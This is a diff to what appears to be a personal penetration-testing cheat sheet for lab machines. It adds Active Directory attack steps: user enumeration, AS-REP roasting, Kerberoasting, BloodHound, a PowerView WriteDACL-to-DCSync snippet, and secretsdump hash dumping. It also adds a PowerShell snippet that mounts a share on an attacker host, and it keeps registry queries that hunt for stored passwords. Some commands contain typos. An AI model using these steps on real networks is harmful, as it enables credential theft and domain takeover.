@@ -120,6 +120,42 @@
   - REG QUERY HKCU /F "password" /t REG_SZ /S /d
   - REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon" /v DefaultPassword /reg:64
 
+### Active Directory
+- [GTfobins for Active Directory](https://wadcoms.github.io/#)
+- domain name
+  - ldapsearch -h IP
+  - -x -h "DC=,DC="
+  - '(objectClass=Person)' sAMAccountName
+- find users: rpcclient -U "" -N $target
+  
+- kerberos pre authentication disabled? - Kerbrute
+  - kerbrute: identify users
+  - getPNusers.py: fetch hash
+  
+- Kerberoasting? getUserspn
+  - Service Principals associated with user
+
+- Enumerate
+  - net user /domain
+  - net user username
+  - Bloodhound:
+    - Upload sharphound + execute
+    - Upload .json/.zip into bloodhound
+    - find connections + bloodhound has attacking detais
+    - OR bloodhound-python + ip + user + password
+- Privilege *writeDACL*
+  - create user: net user NAME /add /domain
+  - add user to group with writeDACT: net group "groupName" /add | net localgroup "groupName" /add
+  - Upload powerview
+  - Assign privilege
+  
+```
+pass = convertto-securestring 'abc123!' -asplain -force
+$cred = new-object system.management.automation.pscredential('htb\john', $pass)
+Add-ObjectACL -PrincipalIdentity john -Credential $credt -Rights DCSync
+``` 
+- run *secretsdump* (impackt) with new user to retrieve hashes
+
 ### SMB
 - smbmap -H $target = Check Privileges 
 - smbmap -H $target -R --depth 5
@@ -137,7 +173,10 @@
   - smb-protocols
   - smb-enum-shares
   - smb-vuln*
+- Online tips:
+  - [smb enum](https://github.com/byt3bl33d3r/CrackMapExec/wiki/SMB-Command-Reference)
 - psexec.py user:pass@$target COMMAND
+- 
 
 ## Linux
 - sudo -l
@@ -239,6 +278,15 @@ png,jpg,config,html,asp,aspx,php,php5,xml,htm,exe
     - copy \\$attacker\share\file
     - copy \\IP\\share\file.ext 
 - [Other methods](https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/)
+
+```
+# ipsec method, create share on linux and connect target to it
+$pass = convertto-securestring 'pass' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('username', $pass)
+
+# generate smb connection
+New-PSDrive -Name user -PSProvider FileSystem -Credential $cred -Root\\$IPATTACKING\ShareName
+```
 
 - Impackt
   - /opt/impacket/
